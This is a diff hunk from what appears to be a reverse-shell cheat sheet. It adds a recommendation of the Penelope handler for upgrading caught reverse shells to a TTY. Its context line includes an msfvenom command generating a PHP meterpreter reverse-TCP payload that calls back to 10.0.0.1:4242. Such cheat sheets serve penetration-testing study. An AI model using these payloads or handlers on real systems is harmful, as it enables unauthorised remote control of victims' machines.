@@ -522,6 +522,15 @@ $ msfvenom -p php/meterpreter_reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f raw > s
 
 ## Spawn TTY Shell
 
+The best and most efficient way to get a TTY shell is to use Penelope shell handler as a listener. (https://github.com/brightio/penelope)
+
+![penelope](https://github.com/user-attachments/assets/64a8c88d-0940-4b57-be02-0bb1a445d6c6)
+
+It automatically upgrades Linux reverse shells to TTY, handles the terminal size, logs everything and much more. Also it provides readline support for Windows shells.
+
+
+### Alternative manual ways
+
 In order to catch a shell, you need to listen on the desired port. `rlwrap` will enhance the shell, allowing you to clear the screen with `[CTRL] + [L]`.
 
 ```powershell
